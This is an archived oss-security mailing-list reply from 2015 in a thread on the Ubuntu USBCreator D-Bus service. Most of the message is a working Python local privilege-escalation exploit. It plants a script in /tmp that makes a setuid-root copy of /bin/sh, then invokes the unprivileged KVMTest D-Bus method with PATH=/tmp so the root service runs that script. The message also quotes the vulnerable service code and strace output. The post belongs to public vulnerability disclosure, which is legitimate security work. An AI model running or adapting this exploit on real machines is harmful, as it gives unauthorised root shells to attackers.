X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6049" "Friday" "24" "April" "2015" "17:04:51" "-0500" "Grandma Eubanks" "tborland1@gmail.com" "<CANtF8NBXucaUqa8=xRZDt4jV2T56=CXs20T2W5FciatmLXPHvQ@mail.gmail.com>" "166" "Re: [oss-security] USBCreator D-Bus service" nil nil nil "4" "2015042422:04:51" "[oss-security] USBCreator D-Bus service" (number mark "        tborland1@gm Apr 24  166/6049  " thread-indent "\"Re: [oss-security] USBCreator D-Bus service\"\n") "<55388FA9.2090401@redhat.com>" ("<CAJ_zFk+imjcZZTm8KwOZia0McwHZ2iQawpXoijRpejM9jt3PGA@mail.gmail.com>" "<20150423000423.GA31439@openwall.com>" "<20150423002746.GD3854@hunt>" "<CAJ_zFk+xFe+BoS-gGabAhkzcbqNxaJF6=S78vn9PfZY+6sq3XA@mail.gmail.com>" "<20150423024947.GA753@openwall.com>" "<55388FA9.2090401@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 11496 invoked by uid 550); 24 Apr 2015 22:05:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11475 invoked from network); 24 Apr 2015 22:05:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
         :content-type;
        bh=zY+Gg5OPz8Bog4HgQjqkyW8Z462nvtmv0nHUrw+MEic=;
        b=vFhu+szE29pWu8ZcgoJy3mHc1sHTx3v5yUR+4NpLvkwbrjPL2x5q3+47bGZk0t89qp
         1hhhtajVTu2t4Wfhn7iQYAhC1IVP/Xdhz4pKf2fDMyUlAAd84bHMIt77Z7Gc8zeN1aSM
         SaN3urv50q0Dt4SF++vEuuSVeQaXAZKfyCJ8WYCaS6X8jqRckvRkmWuczgT+fOCsUluM
         6rtUDiX2Blz8umv22Dl9U9wMaXeP2eo+uCZpVCtXgqST+bAoPRiQyZ62dEi2RCC8Ccb5
         XUVW7esQ4oZR/+aMhybSXr9ap4U7dC0atZVQkDO0q3iByWXGlMjLcyaht6szy8eDF6bk
         ouug==
MIME-Version: 1.0
X-Received: by 10.50.142.2 with SMTP id rs2mr130676igb.1.1429913091439; Fri,
 24 Apr 2015 15:04:51 -0700 (PDT)
In-Reply-To: <55388FA9.2090401@redhat.com>
References: <CAJ_zFk+imjcZZTm8KwOZia0McwHZ2iQawpXoijRpejM9jt3PGA@mail.gmail.com>
	<20150423000423.GA31439@openwall.com>
	<20150423002746.GD3854@hunt>
	<CAJ_zFk+xFe+BoS-gGabAhkzcbqNxaJF6=S78vn9PfZY+6sq3XA@mail.gmail.com>
	<20150423024947.GA753@openwall.com>
	<55388FA9.2090401@redhat.com>
Message-ID: <CANtF8NBXucaUqa8=xRZDt4jV2T56=CXs20T2W5FciatmLXPHvQ@mail.gmail.com>
Content-Type: multipart/alternative; boundary=001a1133d3d2e005bb05147f95d0
Date: Fri, 24 Apr 2015 17:04:51 -0500
From: Grandma Eubanks <tborland1@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] USBCreator D-Bus service
To: oss-security@lists.openwall.com

--001a1133d3d2e005bb05147f95d0
Content-Type: text/plain; charset=UTF-8

So, the reason there's problems in people's VM testing may be due to their
configuration for memory usage. Also, without qemu-kvm (or kvm command in
search path), it won't call KVM and has a limited search path that does not
include CWD and our own controlled envp won't get triggered until kvm is
found. If we can control an arbitrary file creation bug (apport?),
ld_preload would be the way to go as shown in tavis's poc.

# By TurboBorland
# Sometimes, to interact with dbus over remtoe console, you'll need:
# export DISPLAY=:0
import dbus
from os import chmod,unlink

def
test_dbus(bus_type,bus_name,path,interface,object_method_name,*argument):
    bus = dbus.SystemBus()


print("bus_type:\t%s\nbus_name:\t%s\npath:\t\t%s\ninterface:\t%s\nmethod:\t\t%s\nargument:\t%s\n"
% (bus_type,bus_name,path,interface,object_method_name,argument))
    bus_object = bus.get_object(bus_name,path)
    object_method = bus_object.get_dbus_method(object_method_name,interface)
    object_method(*argument)


def check_req():
    f = open("/proc/meminfo","r")
    free = 0
    for line in f:
        if (line.find("MemFree") != -1):
            memfree = (int(line.split(":")[1][:-3])/1024)
            #print(str(memfree))
        elif (line.find("Buffers") != -1):
            buffers = (int(line.split(":")[1][:-3])/1024)
            memfree += buffers
            #print(str(memfree))
    if (memfree < 768):    exit("Not enough memory to pass mem_free()
condition")

def drop_bomb():
    try:    f = open("/usr/bin/kvm","r")
    except IOError as e:    exit("KVM does not exist in /usr/bin/kvm. Wrong
directory or not installed?\n%s" % e)
    for line in f:
        if (line.find("exec") != -1):
            dropfile = "/tmp/" + line.split(" ")[1]

    f = open(dropfile,"w")
    f.write("#!/bin/sh\n/bin/cp /bin/sh /tmp/shell\n/bin/chown root:root
/tmp/shell\n/bin/chmod 04755 /tmp/shell")
    f.close()

    # sigh, tried so hard to stay away from having to do anything with os
import
    # if anyone knows how to set +x without this, I would love you long time
    chmod(dropfile,755)
    return dropfile

def trigger_vuln(dropfile):
    device = "/dev/sda"
    # make sure /tmp is not nosuid, or choose somewhere else
    env = {"DISPLAY": ":0","XAUTHORITY": "a", "PATH": "/tmp"}
    args = (device,env)

    # introspect, enable to see commands and arguments for USBCreator

#test_dbus("system","com.ubuntu.USBCreator","/com/ubuntu/USBCreator","org.freedesktop.DBus.Introspectable","Introspect","")

test_dbus("system","com.ubuntu.USBCreator","/com/ubuntu/USBCreator","com.ubuntu.USBCreator","KVMTest",*args)
    unlink(str(dropfile))

if __name__ == '__main__':
#    check_req()
    print("Requirements passed")
    dropfile = drop_bomb()
    print("The setup is ready")
    trigger_vuln(dropfile)
    exit("shell dropped in /tmp/shell")


'''
vuln code (lack of check_polkit here and kvm-lk):

    @dbus.service.method(USBCREATOR_IFACE, in_signature='sa{ss}',
out_signature='')
    def KVMTest(self, device, env):
        #Run KVM with the freshly created device as the first disk.
        for key in ('DISPLAY', 'XAUTHORITY'):
            if key not in env:
                logging.debug('Missing %s' % key)
                return
        udisks = UDisks.Client.new_sync(None)
        obj = _get_parent_object(udisks, device)
        # TODO unmount all the partitions.
        dev_file =
obj.get_block().get_cached_property('Device').get_bytestring().decode('utf-8')
        if mem_free() >= 768:
            envp = []
            for k, v in env.items():
                envp.append('%s=%s' % (str(k), str(v)))
            cmd = ('kvm', '-m', '512', '-hda', str(dev_file))
            flags = (GObject.SPAWN_SEARCH_PATH)
            # Don't let SIGINT propagate to the child.
            GObject.spawn_async(cmd, envp=envp, flags=flags,
child_setup=os.setsid)
'''

'''
SPAWN_SEARCH_PATH (can we get around this to break the kvm binary
requirement?):
15071 execve("/usr/sbin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
directory)
15071 execve("/usr/bin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
directory)
15071 execve("/sbin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
directory)
15071 execve("/bin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
directory)
'''

I'm sure there's better ways to do some of this, and there's a few comments
you can uncomment to help you figure other things out.

On Thu, Apr 23, 2015 at 1:22 AM, Kurt Seifried <kseifried@redhat.com> wrote:

> On 04/22/2015 07:49 PM, Solar Designer wrote:
> > On Wed, Apr 22, 2015 at 05:50:35PM -0700, Tavis Ormandy wrote:
> >> On Wednesday, April 22, 2015, Seth Arnold <seth.arnold@canonical.com>
> wrote:
> >>> We treat local root escalation vulnerabilities with a high priority[1].
> >>
> >> I wish you had spoken up during the previous discussion. It was my
> >> impression that embargoes for local privilege escalations were
> universally
> >> considered deprecated.
> >
> > I think Kurt's comment (in the linux-distros discussion) on not needing
> > further vulnerability reports embargoed applied solely to ABRT.
> >
> > I can see how this can appear as extending to any local root issues, for
> > users who have ABRT installed and enabled.
> >
> > Kurt might want to clarify this.
> >
> > Alexander
>
> Clarification won't be possible for a bit, I'm actually meeting with
> Tavis tomorrow to discuss this and other things (this was scheduled some
> time ago, it seems I was right in assuming this would become a bigger
> issue =).
>
>
> --
> Kurt Seifried -- Red Hat -- Product Security -- Cloud
> PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
>
>

--001a1133d3d2e005bb05147f95d0--
